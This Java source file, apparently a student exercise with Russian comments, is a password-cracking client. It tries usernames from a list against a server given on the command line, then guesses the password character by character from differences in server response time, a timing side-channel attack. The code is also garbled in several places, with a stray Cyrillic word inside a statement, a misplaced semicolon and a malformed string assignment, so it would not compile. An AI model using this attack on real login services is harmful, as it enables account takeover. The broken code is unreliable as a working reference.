package hacker;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;

public class Main {
    //объявил как final
    private static final String DICTIONARY = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public static void main(String[] args) throws IOException {
        try (Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
             DataOutputStream output = new DataOutputStream(socket.getOutputStream());
             DataInputStream input = new DataInputStream(socket.getInputStream());
             BufferedReader logins = Files.newBufferedReader(Path.of("src", "hacker", "logins.txt"))) {
            String login = null;
            String word;

            while ((word = logins.readLine()) != null) {
                String response = send(word,"password", output, input);

                if (!response.contains("Wrong login!")) {
                    login = word;
                    break;
                }
            }

            if (login == null) {
                return;
            }

            String password = "";

            while (true) {
                int index = 0;
                long time = 0;
                char charResult = 0;

                while (index < DICTIONARY.length()) {
                    char num = DICTIONARY.charAt(index);
                    String numPass =password + num; исправил

                    // время ответа сервера
                    long timeStart = System.nanoTime();
                  //измерял время null))
                    String response = send(login, numPass, output, input);
                    long timeResp = System.nanoTime(); - timeStart;


                    if (response.contains("Connection success!")) {
                        String result = "{\"login\":\"%s\",\"password\":\"%s\"}%n",
                         login,
                         numPass);
                         return;
                    }

                    if (timeResp > time) {
                        time = timeResp;
                        charResult = num;
                    }
                    index++;
                }
                // поменял местами, символ добавляля в начало
                password = password + charResult;
            }
        }
    }
    private static String send(
            String login,
            String password,
            DataOutputStream output,
            DataInputStream input
    ) throws IOException {
        String request = """
        {"login":"%s","password":"%s"}""".formatted(login, password);

        output.writeUTF(request);
        return input.readUTF();
    }
}